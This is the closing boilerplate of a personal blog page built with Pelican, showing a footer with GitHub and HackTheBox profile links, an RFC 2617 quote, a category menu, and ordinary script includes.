                <a class="mg-icon-link" href="https://www.hackthebox.eu/home/users/profile/120322">
                    <i class="uk-icon-HackTheBox uk-icon-medium"></i>
                </a>
            </div>

        </div>

    </div>

</div>

</main>

<footer class="mg-footer">
    <div class="uk-container uk-container-center uk-text-center">

        <div class="mg-icons-small uk-subnav uk-visible-small">
            <li><a rel="alternate" type="application/atom+xml" href="/feeds/all.atom.xml" class="uk-icon-button uk-icon-rss"></a></li>
            <li>
                <a href="https://github.com/pmateja" class="uk-icon-button uk-icon-Github"></a>
            </li>
            <li>
                <a href="https://www.hackthebox.eu/home/users/profile/120322" class="uk-icon-button uk-icon-HackTheBox"></a>
            </li>
        </div>

        <div class="mg-author uk-panel">
            <p>&ldquo;Users and implementors should be aware that this protocol is not as<br />
   secure as Kerberos, and not as secure as any client-side private-key<br />
   scheme. Nevertheless it is better than nothing, better than what is<br />
   commonly used with telnet and ftp, and better than Basic<br />
   authentication<a href="https://tools.ietf.org/html/rfc2617" target="_blank">*</a>.&rdquo;</p>

            <p>Powered by <a href="http://blog.getpelican.com">Pelican</a>.<br class="uk-visible-small"> Theme <a href="https://github.com/lucachr/pelican-mg">mg</a> by <a href="https://github.com/lucachr">Luca Chiricozzi</a>.</p>
        </div>
    </div>
</footer>

<div id="mg-offcanvas" class="uk-offcanvas">
    <div class="uk-offcanvas-bar">

        <form class="uk-search" action="search.html" data-uk-search>
            <input class="uk-search-field" type="search" name="q" id="tipue_search_input" autocomplete="off" placeholder="Search...">
        </form>

        <ul class="uk-nav uk-nav-offcanvas" data-uk-nav>
            <li class="uk-nav-header">Categories</li>
            <li ><a href="/category/food-pl.html">Food [PL]</a></li>
            <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
            <li ><a href="/category/python.html">Python</a></li>
            <li ><a href="/category/snippets.html">Snippets</a></li>
            <li class="uk-nav-header">Pages</li>


            <li class="uk-nav-divider"></li>
            <li><a href="/">Archives</a></li>
        </ul>
    </div>
</div>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.2.min.js"><\/script>')</script>
<script src="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/js/uikit.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/js/components/search.min.js"></script>
<script src="/theme/js/tipuesearch_set.js"></script>
<script src="/theme/js/tipuesearch.js"></script>
<script src="/theme/js/jquery.sticky-kit.js"></script>
<script src="/theme/js/plugins.js"></script>
<script src="/theme/js/main-search.js"></script>



</body>
</html>
